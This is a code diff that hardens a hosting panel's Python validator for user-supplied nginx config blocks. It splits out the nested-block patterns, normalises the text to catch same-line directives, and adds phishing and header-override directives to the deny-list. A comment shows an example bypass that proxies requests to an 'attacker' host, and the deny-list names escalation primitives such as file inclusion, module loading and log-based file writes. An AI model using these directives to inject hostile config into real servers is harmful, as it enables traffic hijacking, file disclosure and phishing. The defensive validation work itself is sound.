@@ -37,40 +37,59 @@ FASTCGI_CACHE_LOCATION_BLOCK = """        # BPANEL FASTCGI CACHE LOCATION BEGIN
         fastcgi_cache_use_stale error timeout invalid_header updating http_500 http_503;
         # BPANEL FASTCGI CACHE LOCATION END"""
 
-# Directives that must never appear inside a per-site custom block.
-# This is a conservative deny-list; safer than allow-list because nginx has
-# many context-dependent valid directives, but it still rejects the common
-# escalation primitives.
-DANGEROUS_DIRECTIVES = re.compile(
-    r"(?mi)^\s*("
-    r"server\s*\{|"           # nesting server blocks
+# Block-opening directives that nest scopes; matched against the original
+# text so the trailing ``{`` is preserved.
+DANGEROUS_BLOCKS = re.compile(
+    r"(?mi)(?:^|[;{}\s])\s*("
+    r"server\s*\{|"
     r"http\s*\{|"
     r"events\s*\{|"
     r"stream\s*\{|"
+    r"upstream\s+[A-Za-z0-9_]+\s*\{"
+    r")"
+)
+
+# Single-line directives. Matched against text where ``{``, ``}``, and ``;``
+# are turned into newlines so directives written on the same physical line
+# as their enclosing block are still seen by the line-start anchor.
+DANGEROUS_DIRECTIVES = re.compile(
+    r"(?mi)^\s*("
     r"include\s+|"            # arbitrary file inclusion
-    r"load_module|"           # load shared object
+    r"load_module\b|"         # load shared object
     r"user\s+|"               # change worker UID
     r"daemon\s+|"
     r"pid\s+|"
-    r"working_directory|"
+    r"working_directory\b|"
     r"lua_|"                  # ngx_lua
     r"perl_|"                 # ngx_http_perl
     r"js_|"                   # njs scripting
-    r"pcre_jit|"
+    r"pcre_jit\b|"
     # ---- routing / upstream subversion ----
     r"proxy_pass\b|"
     r"fastcgi_pass\b|"
     r"uwsgi_pass\b|"
     r"scgi_pass\b|"
     r"grpc_pass\b|"
-    r"upstream\s+|"
     # ---- arbitrary file read / serve ----
     r"alias\s+|"
     r"root\s+|"
     r"auth_basic_user_file\b|"
+    r"try_files\s+|"          # remap request to arbitrary file
     # ---- arbitrary file write via logging ----
     r"access_log\s+|"
     r"error_log\s+|"
+    # ---- HTTP response control / phishing primitives ----
+    r"return\s+|"             # forced redirects, body injection
+    r"error_page\s+|"         # remap error responses to attacker URI
+    r"rewrite\s+|"
+    r"add_header\s+|"         # override security headers
+    r"more_set_headers\b|"
+    r"more_clear_headers\b|"
+    r"auth_request\b|"        # delegate auth to attacker endpoint
+    r"sub_filter\b|"          # rewrite response body
+    r"sub_filter_once\b|"
+    r"addition_before_body\b|"
+    r"addition_after_body\b|"
     # ---- cert path override ----
     r"ssl_certificate\b|"
     r"ssl_certificate_key\b|"
@@ -147,9 +166,19 @@ def validate_custom_nginx(content: Optional[str]) -> str:
                 raise ValueError("Unbalanced braces in custom nginx block")
     if depth != 0:
         raise ValueError("Unbalanced braces in custom nginx block")
-    if DANGEROUS_DIRECTIVES.search(text):
+    if DANGEROUS_BLOCKS.search(text):
         raise ValueError(
-            "Custom block must not contain server/http/events/include or module-loading directives"
+            "Custom block must not nest server/http/events/stream/upstream blocks"
+        )
+    # Normalize so the line-anchored deny-list also catches directives
+    # written on the same line as their enclosing block, e.g.
+    # ``location /api { proxy_pass http://attacker; }`` would otherwise
+    # slip past a plain ``^\s*proxy_pass`` match.
+    normalized = re.sub(r"[{};]", "\n", text)
+    if DANGEROUS_DIRECTIVES.search(normalized):
+        raise ValueError(
+            "Custom block must not contain disallowed directives (proxy_pass, alias, "
+            "return, add_header, ssl_certificate, ...)"
         )
     if "\x00" in text:
         raise ValueError("Custom nginx block contains a NUL byte")
